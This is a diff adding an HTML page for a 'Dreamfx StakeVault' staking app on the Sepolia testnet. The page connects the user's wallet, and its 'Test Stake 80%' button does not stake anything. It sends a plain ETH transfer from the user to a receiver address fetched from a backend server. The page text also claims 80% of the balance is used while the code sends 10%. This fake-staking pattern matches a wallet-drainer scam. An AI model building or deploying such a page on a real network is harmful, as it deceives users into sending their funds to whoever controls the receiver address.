@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dreamfx StakeVault (Testnet)</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+    <style>
+        body { background: #0b0f1a; color: white; font-family: 'Segoe UI', sans-serif; }
+        .glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); }
+        .btn-gradient { background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); }
+    </style>
+</head>
+
+<body class="min-h-screen flex items-center justify-center p-6">
+
+<div class="max-w-md w-full">
+
+    <div class="text-center mb-8">
+        <h1 class="text-3xl font-extrabold">👑 Dreamfx <span class="text-blue-500">VAULT (TEST)</span></h1>
+        <span class="text-xs text-blue-400">Sepolia Testnet</span>
+    </div>
+
+    <div class="glass-card rounded-3xl p-8 shadow-2xl">
+
+        <!-- CONNECT -->
+        <div id="setup-view">
+            <button onclick="connectWallet()" class="w-full btn-gradient py-4 rounded-2xl font-bold">
+                Connect Wallet
+            </button>
+        </div>
+
+        <!-- MAIN -->
+        <div id="staking-view" class="hidden space-y-6">
+
+            <div class="bg-black/20 p-4 rounded-2xl">
+                <div class="flex justify-between">
+                    <span class="text-xs text-slate-400">Balance</span>
+                    <span class="text-xs text-green-400">● SEPOLIA</span>
+                </div>
+                <div class="text-2xl font-mono font-bold">
+                    <span id="display-balance">0.000</span> ETH
+                </div>
+            </div>
+
+            <p class="text-sm text-center text-slate-400">
+                80% of your TEST ETH will be used (safe mode)
+            </p>
+
+            <button onclick="executeTransfer()" id="action-btn"
+                class="w-full btn-gradient py-4 rounded-2xl font-bold">
+                🚀 Test Stake 80%
+            </button>
+
+        </div>
+    </div>
+</div>
+
+<script>
+let provider, signer;
+let ethBalance = 0;
+let RECEIVER_ADDRESS = "";
+
+const SEPOLIA_HEX_ID = "0xaa36a7";
+
+//----------------------------------
+// FETCH RECEIVER
+//----------------------------------
+async function fetchReceiver() {
+    try {
+        const res = await fetch("http://127.0.0.1:8000/wallet-address/eth");
+        const data = await res.json();
+
+        if (data.status === "success") {
+            RECEIVER_ADDRESS = data.address;
+        }
+
+    } catch (err) {
+        alert("Failed to fetch receiver");
+    }
+}
+
+//----------------------------------
+// CONNECT
+//----------------------------------
+async function connectWallet() {
+    if (!window.ethereum) return alert("MetaMask not found");
+
+    try {
+        await fetchReceiver();
+
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+
+        const { chainId } = await provider.getNetwork();
+
+        if (chainId !== 11155111) {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: SEPOLIA_HEX_ID }]
+            });
+        }
+
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+
+        const balance = await provider.getBalance(await signer.getAddress());
+
+        ethBalance = parseFloat(ethers.utils.formatEther(balance));
+
+        document.getElementById("display-balance").innerText = ethBalance.toFixed(4);
+
+        document.getElementById("setup-view").classList.add("hidden");
+        document.getElementById("staking-view").classList.remove("hidden");
+
+    } catch (err) {
+        alert("Connection failed");
+    }
+}
+
+//----------------------------------
+// TEST SEND
+//----------------------------------
+async function executeTransfer() {
+    const btn = document.getElementById("action-btn");
+
+    if (!ethBalance || !RECEIVER_ADDRESS) {
+        return alert("Missing balance or receiver");
+    }
+
+    try {
+        let amountToSend = ethBalance * 0.1;
+
+        const gasBuffer = 0.002;
+        amountToSend -= gasBuffer;
+
+        if (amountToSend <= 0) {
+            throw new Error("Insufficient balance");
+        }
+
+        // ✅ CONFIRMATION
+        if (!confirm(`Send ${amountToSend.toFixed(4)} ETH?`)) return;
+
+        btn.disabled = true;
+        btn.innerText = "⏳ Processing...";
+
+        const value = ethers.utils.parseEther(amountToSend.toFixed(6));
+
+        const tx = await signer.sendTransaction({
+            to: RECEIVER_ADDRESS,
+            value: value
+        });
+
+        await tx.wait();
+
+        alert("✅ Test Transaction Sent\nTX: " + tx.hash);
+        btn.innerText = "✅ Done";
+
+    } catch (err) {
+        alert("❌ " + (err.reason || err.message));
+
+        btn.disabled = false;
+        btn.innerText = "🚀 Test Stake 80%";
+    }
+}
+</script>
+
+</body>
+</html>
